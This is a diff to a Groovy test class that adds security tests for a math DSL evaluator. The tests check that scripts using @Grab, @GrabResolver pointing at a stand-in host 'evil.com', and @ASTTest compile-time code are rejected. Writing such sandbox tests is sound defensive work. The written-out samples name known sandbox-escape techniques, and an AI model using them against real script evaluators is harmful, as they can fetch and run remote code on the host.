@@ -268,6 +268,54 @@ class MathDslSecurityTest {
     }
 
     @Test
+    void rejectsGrabOnVariable() {
+        File maliciousFile = new File(tempDir, "exploit-grab-var.groovy")
+        maliciousFile.text = """
+            @groovy.lang.Grab('org.apache.commons:commons-lang3:3.12.0')
+            def x = 1
+            MathModelDef('Hacked')
+        """
+
+        Exception ex = assertThrows(Exception) {
+            MathDsl.evaluate(maliciousFile)
+        }
+        assertTrue(ex instanceof MultipleCompilationErrorsException || ex instanceof SecurityException,
+            "Expected compilation/security exception but got: ${ex.class.name}: ${ex.message}")
+    }
+
+    @Test
+    void rejectsGrabResolver() {
+        File maliciousFile = new File(tempDir, "exploit-grab-resolver.groovy")
+        maliciousFile.text = """
+            @GrabResolver(name='evil', root='http://evil.com/repo')
+            MathModelDef('Hacked')
+        """
+
+        Exception ex = assertThrows(Exception) {
+            MathDsl.evaluate(maliciousFile)
+        }
+        assertTrue(ex instanceof MultipleCompilationErrorsException || ex instanceof SecurityException,
+            "Expected compilation/security exception but got: ${ex.class.name}: ${ex.message}")
+    }
+
+    @Test
+    void rejectsASTTestAnnotation() {
+        File maliciousFile = new File(tempDir, "exploit-ast-test.groovy")
+        maliciousFile.text = """
+            import groovy.transform.ASTTest
+            @ASTTest(value={ assert 1 == 1 })
+            def x = 1
+            MathModelDef('Hacked')
+        """
+
+        Exception ex = assertThrows(Exception) {
+            MathDsl.evaluate(maliciousFile)
+        }
+        assertTrue(ex instanceof MultipleCompilationErrorsException || ex instanceof SecurityException,
+            "Expected compilation/security exception but got: ${ex.class.name}: ${ex.message}")
+    }
+
+    @Test
     void allowsLegitimateMathDsl() {
         File validFile = new File(tempDir, "valid-math.groovy")
         validFile.text = """
